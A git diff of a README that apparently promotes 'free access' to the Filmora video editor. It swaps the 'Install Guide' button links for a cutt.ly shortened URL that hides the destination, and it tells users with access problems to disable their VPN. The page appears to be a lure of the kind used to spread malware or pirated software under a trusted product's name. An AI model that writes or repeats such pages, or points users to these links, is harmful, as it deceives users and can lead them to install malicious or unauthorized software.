@@ -7,7 +7,7 @@
 
 **Description**: Elevate your video editing with the **Filmora Free Access Hub** in 2025! This repository offers exclusive tutorials, resources, and tips to explore AI-powered features like Smart Short Clips, AI Video Enhancer, and 4K editing. Join our trusted community of creators with over 200K downloads!  
 
-<a href="https://filmora-community.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/MrNttPtr" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -31,10 +31,9 @@ Master video editing with Filmora using these simple steps to access free resour
 5. **Access Problems?** 🌐  
    If the package access fails, try disabling your VPN or switching browsers (e.g., Chrome, Firefox).  
 
-<a href="https://filmora-community.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/MrNttPtr" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
-
 
 ## 💡 Why Choose Filmora Free Access  
 
